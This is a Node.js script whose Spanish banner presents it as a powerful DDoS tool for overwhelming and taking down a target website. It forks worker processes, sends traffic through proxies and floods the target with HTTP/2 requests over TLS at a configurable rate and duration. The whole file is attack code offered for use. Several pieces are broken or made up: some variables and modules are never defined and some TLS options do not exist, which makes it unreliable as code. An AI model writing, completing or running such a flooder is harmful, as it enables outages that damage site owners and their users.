const net = require('net');
const http = require('http');
const https = require('https'); // Para conexiones SSL/TLS
const tls = require('tls');
const stream = require('stream'); // For ZLIB streams

const crypto = require('crypto'); // For hashing
const fs = require('fs');
const url = require('url');
const axios = require('axios'); // npm install axios
const cluster = require('cluster'); //Multi procesos
//const urllib = require('urllib'); // npm install urllib - Para reemplazar urllib.request
require('events').EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {
});

// Colores ANSI para la consola
const red = '\x1b[31m';
const reset = '\x1b[0m';

const banner = `\x1b[31m
======================================================================
|                          ______  __ __ __________                    |
|                         / / __ \\/ //_// ____/ __ \\                   |
|                    __  / / / / / ,<  / __/ / /_/ /                   |
|                   / /_/ / /_/ / /| |/ /___/ _, _/                    |
|                   \\____/\\____/_/ |_/_____/_/ |_|                     |
|                                                                      |
|                                                                      |
======================================================================
|  Este es un código de ataque DDoS muy potente, y sirve para mandar   |
|       tráfico web con información falsa al sitio deseado, para       |
|             desestabilizar sus servidores y derribarlo.              |
======================================================================
|                                              By: ZeroEthical |
======================================================================\x1b[0m`;

console.log(banner);

// Funciones de utilidad
function generarHashMD5(data) {
  return crypto.createHash('md5').update(data).digest('hex');
}

function codificarBase64(data) {
  return Buffer.from(data).toString('base64');
}

function generarRandom() {
  return Math.random();
}

function codificarGzip(data) {
  return zlib.gzipSync(data); // Returns a Buffer
}

function generarUUID() {
  return crypto.randomUUID(); // Genera un UUID (Universally Unique Identifier)
}

function parsearURL(urlStr) {
  return url.parse(urlStr);
}

// Lee líneas del archivo (lista de proxies)
function readLines(filePath) {
  return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

// Función para generar una IP falsa
const ip_spoof = () => {
    const ip_segment = () => {
        return Math.floor(Math.random() * 255);
    };
    return `${""}${ip_segment()}${"."}${ip_segment()}${"."}${ip_segment()}${"."}${ip_segment()}${""}`;
};
 
// Variables globales
const UserAgent = require('user-agents');
const randomReferer = "https://www.google.com/search?q=" + randomString(30); // Genera un referer aleatorio
const uap = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",];

// Función para generar una cadena aleatoria
function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}
 

//Proceso de Argumentos
 if (process.argv.length < 7){
 console.log(``);
 console.log(`\x1b[31m node joker.js [url] [time] [rate] [threads] [proxy_file]\x1b[0m`); process.exit();}
 const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
 }

// Variables de control de Headers y Cipher.
const HTTPS = "https://"

 const websocket = "websocket";
 const trailers = "trailers"
 const concu = "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM" // Puedes poner la lista de ciphers que quieras, o dejala vacía, el script igual funciona
 const randomHeaders = {
        "content-type": 'text/html; charset=utf-8',
        "upgrade-insecure-requests": '1',
        "x-download-options": 'noopen',
        "Cross-Origin-Embedder-Policy": 'require-corp',
        "Cross-Origin-Opener-Policy": 'unsafe-none',
        "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        "accept-language": 'en-US,en;q=0.5',
        "Referrer-Policy": 'origin-when-cross-origin',
        "x-cache": 'HIT',
        "Content-Security-Policy": "upgrade-insecure-requests",
        "accept-encoding": 'gzip, deflate, br',
        "cache-control": 'max-age=0',
        "x-frame-options": 'SAMEORIGIN',
        "x-xss-protection": '1; mode=block',
        "pragma": 'no-cache',
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": 'document',
        "sec-fetch-mode": 'navigate',
        "sec-fetch-site": 'same-origin',
        "sec-ch-ua": '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        "sec-ch-ua-mobile": '?0',
       "Content-Encoding": 'gzip',
        "alt-svc": 'h3=":443"; ma=86400',
}
//Iniciación del ataque
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    console.log(banner);
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
 }else {setInterval(runFlooder) }


function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
    headers[":authority"] = parsedTarget.host
    headers["user-agent"] = uap1;

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 25
    };

    setTimeout(function(){
      process.exit(1);
    }, args.time * 1000);
    
    process.on('uncaughtException', function(er) {
    });
    process.on('unhandledRejection', function(er) {
    });

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 900000);

         const tlsOptions = {
            ALPNProtocols: ['h2'],
            challengesToSolve: Infinity,
            resolveWithFullResponse: true,
            followAllRedirects: true,
            maxRedirects: 10,
            clientTimeout: 5000,
            clientlareMaxTimeout: 10000,
            cloudflareTimeout: 5000,
            cloudflareMaxTimeout: 30000,
            ciphers: tls.getCiphers().join(":") + cipper,
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
            servername: url.hostname,
            socket: connection,
            honorCipherOrder: true,
            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
            sigals: concu,
            echdCurve: "GREASE:X25519:x25519:P-256:P-384:P-521:X448",
            secure: true,
            Compression: false,
            rejectUnauthorized: false,
            port: 443,
            uri: parsedTarget.host,
            servername: parsedTarget.host,
            sessionTimeout: 5000,
        };

         const tlsConn = tls.connect(443, parsedTarget.hostname, tlsOptions); 

         tlsConn.setKeepAlive(true, 60 * 10000);
 
         const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          },
             maxSessionMemory: 64000,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
        client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 20000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers)
                    
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     });
 }

function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
   }
